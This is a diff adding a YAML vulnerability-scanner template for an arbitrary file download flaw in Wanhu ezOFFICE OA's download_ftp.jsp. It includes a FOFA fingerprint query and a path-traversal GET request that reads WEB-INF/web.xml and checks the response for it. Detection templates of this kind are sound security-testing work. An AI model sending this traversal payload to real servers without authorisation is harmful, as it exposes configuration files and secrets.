@@ -1,0 +1,20 @@
+id: wanhu-oa-download-ftp-fileread
+
+info:
+  name: 万户OA download_ftp.jsp 任意文件下载漏洞
+  author: zan8in
+  severity: high
+  verified: false
+  description: |
+    万户OA download_ftp.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件
+    fofa: app="万户网络-ezOFFICE"
+  tags: wanhu,download,ftp,fileread
+  created: 2025/03/13
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
+    expression: response.status == 200 && response.body.bcontains(b'<web-app') && response.body.bcontains(b'</web-app>')
+expression: r0()
